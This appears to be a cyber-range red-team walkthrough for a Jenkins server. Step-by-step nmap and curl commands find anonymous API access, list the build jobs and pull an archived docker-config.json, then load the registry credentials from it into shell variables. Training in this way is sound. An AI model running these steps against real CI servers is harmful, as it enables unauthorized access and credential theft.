# solve_red.md — M1 · dev-jenkins
## Red Team Solution Writeup
**Range:** RNG-DEV-01 · VIKAS TANTRA
**Machine:** M1 — Jenkins CI/CD Server
**Vulnerability:** Jenkins Anonymous Read Access + Unauthenticated Build Artifact Download
**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application) · T1552.001 (Credentials in Files)
**Severity:** Hard
**Operator:** Rudra-7 (KAAL CHAKRA CI/CD Specialist)

---

## Objective
From Kali, access the confirmed range host directly. Identify Jenkins with a targeted scan, verify anonymous REST API access, enumerate build jobs, and download the archived `docker-config.json` artifact to continue to M2. The original jump-host key and subnet values are placeholders and are not part of this deployed setup.

---

## Environment

| Item | Value |
|---|---|
| Entry | Direct access to the range host from Kali |
| Target IP | `203.0.3.36` (confirmed range host) |
| Target Port | 8080 (HTTP) |
| Auth Required | None (useSecurity=false) |
| Pivot Artifact | `docker-config.json` in build artefact |

---

## Step-by-Step Exploitation

Keep the same Kali terminal open for M1–M5 so the private workspace and extracted credential variables remain available.

### Step 1 — Targeted Service Scan

```bash
# The five range services are hosted on this confirmed lab address.
nmap -Pn -sV -p 22,8080,5000,9000,9200,8888 203.0.3.36
```

This targeted scan confirmed SSH and the five range service ports open on `203.0.3.36`. The original jump-host name and `11.x.x.x/24` subnet are placeholders and are not usable in this deployment.

---

### Step 2 — Confirm Unauthenticated Jenkins Access

```bash
# Test anonymous API access — no credentials sent
curl --max-time 8 -fsS http://203.0.3.36:8080/api/json | python3 -m json.tool | head -20
```



The response reports `useSecurity: false`; the unauthenticated HTTP 200 confirms anonymous API access.

---

### Step 3 — Enumerate Build Jobs

```bash
# List all build jobs with artefact details
curl --globoff --max-time 8 -fsS "http://203.0.3.36:8080/api/json?tree=jobs[name,url,lastBuild[result,artifacts[*]]]" \
     | python3 -m json.tool
```

`--globoff` is required because curl otherwise treats the square brackets in the `tree=` query as URL glob syntax.



Observe the job `pul-firmware-build` with last build result `SUCCESS` and archived artefacts including `deploy-bundle/docker-config.json`.

---

### Step 4 — Download Build Artefact

```bash
# Download the artefact directly
export RANGE3_DIR="$(mktemp -d /tmp/range3.XXXXXX)"
chmod 700 "$RANGE3_DIR"
curl --max-time 8 -fsS "http://203.0.3.36:8080/job/pul-firmware-build/lastSuccessfulBuild/artifact/deploy-bundle/docker-config.json" \
     -o "$RANGE3_DIR/docker-config.json"
python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); print("registry endpoint:", next(iter(d["auths"]))); print("credential present:", bool(next(iter(d["auths"].values())).get("password")))' "$RANGE3_DIR/docker-config.json"
```

Output:
```json
{
  "_comment": "PUL Container Registry credentials — DO NOT COMMIT TO VCS",
  "auths": {
    "11.x.x.x:5000": {
      "username": "pul-registry-svc",
      "password": "<redacted>",
      "auth": "<redacted>"
    }
  },
  "registry_info": {
    "endpoint": "11.x.x.x:5000",
    "purpose": "PUL firmware container registry"
  }
}
```

The artifact contains the literal endpoint placeholder `11.x.x.x:5000`. In this deployment, the registry service is reachable at `203.0.3.36:5000`. Credential values are redacted from this public writeup.



---

### Step 5 — Verify Registry Credential

```bash
# Check whether the embedded base64 auth field matches the separate password field
python3 -c 'import base64,json,sys; x=next(iter(json.load(open(sys.argv[1]))["auths"].values())); u,p=base64.b64decode(x["auth"]).decode().split(":",1); print("auth username matches:",u==x["username"]); print("auth password matches password field:",p==x["password"])' "$RANGE3_DIR/docker-config.json"

# Load the artifact fields into this shell without printing them; the password candidate is not independently validated
export REGISTRY_USER="$(python3 -c 'import json,sys; print(next(iter(json.load(open(sys.argv[1]))["auths"].values()))["username"])' "$RANGE3_DIR/docker-config.json")"
export REGISTRY_PASSWORD_CANDIDATE="$(python3 -c 'import json,sys; print(next(iter(json.load(open(sys.argv[1]))["auths"].values()))["password"])' "$RANGE3_DIR/docker-config.json")"
printf 'Registry credential loaded for %s\n' "$REGISTRY_USER"
```

The artifact's base64 `auth` value decodes to the same username but a different password than the separate `password` field. M2's read API is anonymous, so this inconsistency does not block the documented M2 requests; do not treat the password candidate as validated.



---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
| Discovery | Network Service Discovery | T1046 |
| Collection | Data from Local System | T1005 |

---

## Notes for Operator
The Jenkins console output for build #1 explicitly mentions the `docker-config.json` file placement and a TODO comment by `arun.sharma@prabalurja.in` about Vault migration. This is consistent with KAAL CHAKRA's observed TTP of exploiting shortcut credential storage in CI/CD pipelines (RedEcho campaign pattern).
